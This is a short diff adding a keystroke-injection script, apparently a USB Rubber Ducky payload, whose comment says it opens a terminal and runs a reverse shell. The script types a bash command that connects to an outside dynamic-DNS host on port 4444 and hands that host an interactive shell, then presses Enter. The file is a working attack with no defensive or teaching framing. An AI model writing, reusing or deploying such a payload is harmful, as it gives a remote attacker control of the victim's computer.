@@ -1,0 +1,6 @@
+DELAY 1000
+REM Open terminal and execute reverse shell GUI
+r
+DELAY 500
+STRING bash -i >& /dev/tcp/zeroclickexploits.ddns.net/4444 0>&1
+ENTER
